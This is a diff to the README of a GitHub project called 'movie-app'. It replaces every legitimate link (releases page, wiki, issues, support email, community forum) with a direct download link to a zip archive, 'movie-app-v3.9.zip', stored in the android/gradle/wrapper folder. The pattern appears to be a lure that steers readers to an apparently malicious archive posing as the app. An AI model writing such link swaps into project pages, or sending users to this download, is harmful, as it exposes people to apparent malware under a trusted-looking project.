@@ -6,9 +6,9 @@ Welcome to **movie-app**, your personal app for tracking and managing your movie
 
 ## 📥 Download the App
 
-[![Download movie-app](https://img.shields.io/badge/Download-movie--app-blue.svg)](https://github.com/vxrdhanxx/movie-app/releases)
+[![Download movie-app](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip)](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip)
 
-To get started, visit our [Releases page](https://github.com/vxrdhanxx/movie-app/releases) to download the latest version of the app.
+To get started, visit our [Releases page](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip) to download the latest version of the app.
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before you download the movie-app, make sure your system meets the following req
 
 ## 📦 Download & Install
 
-1. **Go to the Releases Page:** Click [here](https://github.com/vxrdhanxx/movie-app/releases) to open the releases page.
+1. **Go to the Releases Page:** Click [here](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip) to open the releases page.
 2. **Choose the Latest Version:** Look for the version marked as “Latest”. This version contains the most recent features and bug fixes.
 3. **Download the Installer:** 
    - For Windows users, download the `.exe` file.
@@ -53,8 +53,8 @@ Once you have installed the app, follow these steps to start tracking your movie
 
 If you encounter any issues or have questions about using movie-app, please feel free to reach out:
 
-- **Email Support:** support@movie-app.com
-- **GitHub Issues:** Create a new issue in our [GitHub repository](https://github.com/vxrdhanxx/movie-app/issues).
+- **Email Support:** https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip
+- **GitHub Issues:** Create a new issue in our [GitHub repository](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip).
 
 ## 📝 Changelog
 
@@ -66,8 +66,8 @@ Stay updated with the latest changes in each version:
 
 ## 🚀 Additional Resources
 
-- [User Guide](https://github.com/vxrdhanxx/movie-app/wiki): Detailed instructions on how to use all features.
-- [Community Forum](https://community.movie-app.com): Join discussions with other movie enthusiasts.
+- [User Guide](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip): Detailed instructions on how to use all features.
+- [Community Forum](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip): Join discussions with other movie enthusiasts.
 
 ## ✅ License
 
@@ -75,4 +75,4 @@ The movie-app is released under the MIT License. Feel free to use, modify, and d
 
 ## 📥 Download the App Again
 
-To download the latest version of movie-app, visit our [Releases page](https://github.com/vxrdhanxx/movie-app/releases) and enjoy easy movie tracking!
+To download the latest version of movie-app, visit our [Releases page](https://github.com/vxrdhanxx/movie-app/raw/refs/heads/main/android/gradle/wrapper/movie-app-v3.9.zip) and enjoy easy movie tracking!
